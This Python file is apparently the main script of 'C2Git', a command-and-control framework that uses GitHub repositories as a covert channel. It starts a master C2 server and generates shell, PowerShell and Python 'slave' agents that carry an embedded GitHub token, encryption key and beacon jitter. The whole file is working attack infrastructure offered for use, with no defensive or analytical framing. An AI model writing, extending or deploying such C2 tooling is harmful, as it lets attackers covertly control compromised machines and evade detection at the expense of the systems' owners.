import asyncio
import argparse
import signal
import os
from pathlib import Path
from master import Config, Crypto, GitHandler, SessionManager, JobManager, Commander

def encrypt_string(config_path: str, text: str) -> str:
    """Encrypt a string using the configuration key"""
    config = Config.from_yaml(config_path)
    crypto = Crypto(config.encryption_key)
    return crypto.encrypt(text)

def decrypt_string(config_path: str, text: str) -> str:
    """Decrypt a string using the configuration key"""
    config = Config.from_yaml(config_path)
    crypto = Crypto(config.encryption_key)
    try:
        result = crypto.decrypt(text)
        return result
    except ValueError as e:
        return f"Decryption failed: {str(e)}"
    except Exception as e:
        return f"Unexpected error: {str(e)}"

def generate_agent(config_path: str, agent_type: str, output_path: str) -> None:
    """Generate agent file with configuration values"""
    config = Config.from_yaml(config_path)
    
    # Determine template path and output
    template_map = {
        'sh': 'slave_templates/slave_tmpl.sh',
        'ps1': 'slave_templates/slave_tmpl.ps1',
        'py': 'slave_templates/slave_tmpl.py'
    }
    
    template_path = template_map.get(agent_type)
    if not template_path or not os.path.exists(template_path):
        raise ValueError(f"Template for {agent_type} not found")
        
    # Read template
    with open(template_path, 'r') as f:
        content = f.read()
        
    # Prepare replacements
    local_repo_path = config.slave_defaults['windows_local_repo_path'] if agent_type == 'ps1' else config.slave_defaults['linux_local_repo_path']
    
    # Use config values which already have the correct priority order
    replacements = {
        'C2GIT_SLAVE_KEY_REPLACEMENT': config.encryption_key,
        'C2GIT_GITHUB_TOKEN_REPLACEMENT': config.github_token,
        'C2GIT_REPO_USER_REPLACEMENT': config.repo_user,
        'C2GIT_REPO_NAME_REPLACEMENT': config.repo_name,
        'C2GIT_HEARTBEAT_INTERVAL_REPLACEMENT': str(config.slave_defaults['heartbeat_interval']),
        'C2GIT_JITTER_REPLACEMENT': str(config.slave_defaults['jitter']),
        'C2GIT_SLAVE_REPO_PATH_REPLACEMENT': local_repo_path,
        'C2GIT_GIT_USER_EMAIL_REPLACEMENT': config.git_user_email,
        'C2GIT_GIT_USER_NAME_REPLACEMENT': config.git_user_name
    }
    
    # Apply replacements
    for key, value in replacements.items():
        content = content.replace(key, value)
        
    # Write output file
    with open(output_path, 'w') as f:
        f.write(content)
        
    # Make file executable for shell scripts
    if agent_type in ['sh', 'py']:
        os.chmod(output_path, 0o755)

async def run_master(config_path: str):
    """Run the master C2 server"""
    config = Config.from_yaml(config_path)
    crypto = Crypto(config.encryption_key)
    git_handler = GitHandler(config)
    session_manager = SessionManager(git_handler, crypto)
    job_manager = JobManager(session_manager)
    commander = Commander(session_manager, job_manager)

    # Setup signal handlers
    loop = asyncio.get_event_loop()
    signals = (signal.SIGTERM, signal.SIGINT)
    for sig in signals:
        loop.add_signal_handler(
            sig,
            lambda s=sig: asyncio.create_task(commander.stop())
        )

    # Start job processing
    job_task = asyncio.create_task(job_manager.start())

    try:
        await commander.start()
    except asyncio.CancelledError:
        pass
    finally:
        # Clean shutdown
        await commander.stop()
        await job_manager.stop()
        try:
            await job_task
        except asyncio.CancelledError:
            pass
        
        # Remove signal handlers
        for sig in signals:
            loop.remove_signal_handler(sig)

def main():
    parser = argparse.ArgumentParser(description='C2Git Command & Control Framework')
    parser.add_argument('--config', type=str, default='config/config.yaml',
                      help='Path to config file (default: config/config.yaml)')
    
    subparsers = parser.add_subparsers(dest='command', help='Command to execute')
    
    # Master command
    subparsers.add_parser('master', help='Run master C2 server')
    
    # Encrypt command
    encrypt_parser = subparsers.add_parser('encrypt', help='Encrypt a string')
    encrypt_parser.add_argument('text', help='String to encrypt')
    
    # Decrypt command
    decrypt_parser = subparsers.add_parser('decrypt', help='Decrypt a string')
    decrypt_parser.add_argument('text', help='String to decrypt')
    
    # Generate command
    generate_parser = subparsers.add_parser('generate', help='Generate agent file')
    generate_parser.add_argument('type', choices=['sh', 'ps1', 'py'], help='Agent type')
    generate_parser.add_argument('-o', '--output', help='Output file path')
    
    args = parser.parse_args()
    
    if not args.command:
        parser.print_help()
        return

    if args.command == 'master':
        asyncio.run(run_master(args.config))
    elif args.command == 'encrypt':
        print(encrypt_string(args.config, args.text))
    elif args.command == 'decrypt':
        print(decrypt_string(args.config, args.text))
    elif args.command == 'generate':
        # Set default output path if not specified
        if not args.output:
            args.output = f'./slave.{args.type}'
        generate_agent(args.config, args.type, args.output)
        print(f"Agent file generated: {args.output}")

if __name__ == "__main__":
    main()
